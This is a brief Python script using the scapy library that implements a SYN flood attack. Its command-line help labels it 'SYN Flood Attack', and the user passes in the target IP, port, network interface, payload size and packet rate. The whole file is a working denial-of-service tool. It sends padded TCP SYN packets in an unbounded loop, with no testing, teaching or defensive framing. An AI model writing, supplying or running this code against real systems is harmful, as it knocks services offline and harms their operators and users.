from scapy.all import *
import argparse

def syn_flood(target_ip, target_port, interface, packet_size=1024, rate=1000):
    ip_layer = IP(dst=target_ip)
    tcp_layer = TCP(dport=target_port, flags="S")
    raw_layer = Raw(load="X"*packet_size)

    packet = ip_layer / tcp_layer / raw_layer
    send(packet, iface=interface, loop=1, verbose=False, inter=1/rate)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flood Attack")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port number")
    parser.add_argument("interface", help="Network interface to use")
    parser.add_argument("--packet_size", type=int, default=1024, help="Size of the payload in bytes")
    parser.add_argument("--rate", type=int, default=1000, help="Rate of packets per second")
    args = parser.parse_args()

    syn_flood(args.target_ip, args.target_port, args.interface, args.packet_size, args.rate)